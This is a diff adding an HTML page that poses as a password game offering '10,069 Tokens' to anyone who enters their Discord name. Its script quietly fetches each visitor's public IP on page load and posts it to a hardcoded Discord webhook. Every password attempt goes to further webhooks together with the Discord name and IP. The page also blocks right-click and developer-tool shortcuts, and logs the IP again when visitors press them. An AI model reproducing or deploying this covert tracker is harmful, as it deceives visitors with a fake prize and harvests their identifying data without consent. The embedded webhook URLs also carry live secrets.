@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Password Protected Page</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #121212;
+            font-family: Arial, sans-serif;
+            color: #ffffff;
+        }
+        .container {
+            text-align: center;
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+        }
+        input[type="text"] {
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #333;
+            color: #ffffff;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .note {
+            font-size: 14px;
+            color: #cccccc;
+            margin-bottom: 15px;
+        }
+        #logIPButton {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 id="message">Enter Password to Win 10,069 Tokens</h1>
+        <p class="note">PASSWORD IS ALL LOWERCASE NO SPACES AND ENTER YOUR DISCORD</p>
+        <input type="text" id="discordName" placeholder="Discord Name">
+        <input type="text" id="password" placeholder="Password">
+        <button onclick="checkPassword()">Enter</button>
+        <button id="logIPButton" onclick="logIP()">Log IP</button>
+    </div>
+
+    <script>
+        const correctPassword = 'fullstop'; // Updated password
+        const hint = 'end of a sentence.'; // Updated hint
+        let hintShown = false;
+        let cooldown = false;
+
+        document.getElementById('password').addEventListener('keydown', function(event) {
+            if (event.key === ' ') {
+                event.preventDefault();
+            }
+            if (event.key === 'Enter' && !cooldown) {
+                checkPassword();
+                startCooldown();
+            }
+        });
+
+        document.getElementById('discordName').addEventListener('keydown', function(event) {
+            if (event.key === 'Enter' && !cooldown) {
+                checkPassword();
+                startCooldown();
+            }
+        });
+
+        function startCooldown() {
+            cooldown = true;
+            setTimeout(() => {
+                cooldown = false;
+            }, 5000);
+        }
+
+        function checkPassword() {
+            const password = document.getElementById('password').value;
+            const discordName = document.getElementById('discordName').value;
+
+            // Check if password or Discord name contains @everyone
+            if (password.includes('@everyone') || discordName.includes('@everyone')) {
+                alert('Invalid input: @everyone cannot be used.');
+                return;
+            }
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+
+                    if (password === correctPassword) {
+                        document.body.innerHTML = '<h1>You will receive your tokens shortly</h1>';
+                        // Send correct password information to the new main webhook with @everyone ping
+                        sendToWebhook('https://discord.com/api/webhooks/1264305776424386721/1yBHvHNw18uvLrVT50wefmwJVnqvDdazI3xHqxA6SNBGrAyr75bOceLmd6-tLqfMT0cp', password, discordName, ip, true);
+                    } else {
+                        // Send incorrect password attempt to the secondary webhook without @everyone ping
+                        sendToWebhook('https://discord.com/api/webhooks/1264305780350259301/uWTaa1vkK3cUWRavl0AGy9UDNuafyDE7t5O6OfsPto9AHrk0iSd7Jp3TWjCFoPQFzrSb', password, discordName, ip, false);
+                        if (!hintShown) {
+                            document.getElementById('message').innerText = 'Incorrect password! Hint: ' + hint;
+                            hintShown = true;
+                        } else {
+                            alert('Incorrect password!');
+                        }
+                    }
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        function sendToWebhook(webhookUrl, password, discordName, ip, pingEveryone) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    content: (pingEveryone ? `@everyone\n` : '') + `Password: ${password}\nDiscord Name: ${discordName}\nIP: ${ip}` 
+                })
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Error sending data to webhook:', response.statusText);
+                }
+            }).catch(error => {
+                console.error('Error sending data to webhook:', error);
+            });
+        }
+
+        function sendIPToWebhook(webhookUrl, ip, source) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    content: `IP: ${ip}\nLogged via: ${source}` 
+                })
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Error sending IP to webhook:', response.statusText);
+                }
+            }).catch(error => {
+                console.error('Error sending IP to webhook:', error);
+            });
+        }
+
+        function logIP(source) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendIPToWebhook('https://discord.com/api/webhooks/1264374636083413107/OyK5wOYNdYKFzND6zes5gCh3oMHyTCrzcwuoDsMgiFk36INZJtg8m5QjE5Y3ve_MApa2', ip, source);
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        // Call logIP function when the page loads
+        window.onload = function() {
+            logIP('page load');
+        };
+
+        // Disable right-click
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Disable developer tools shortcuts and trigger IP logging
+        document.addEventListener('keydown', event => {
+            const invalidKeys = ['I', 'C', 'J', 'U'];
+            if (event.key === 'F12') {
+                event.preventDefault();
+                logIP('F12');
+            } else if (event.ctrlKey && event.shiftKey && invalidKeys.includes(event.key.toUpperCase())) {
+                event.preventDefault();
+                logIP(`Ctrl+Shift+${event.key.toUpperCase()}`);
+            } else if (event.ctrlKey && event.key.toUpperCase() === 'U') {
+                event.preventDefault();
+                logIP('Ctrl+U');
+            } else if (event.ctrlKey && event.key.toUpperCase() === 'I') {
+                event.preventDefault();
+                logIP('Ctrl+I');
+            }
+        });
+    </script>
+</body>
+</html>
+
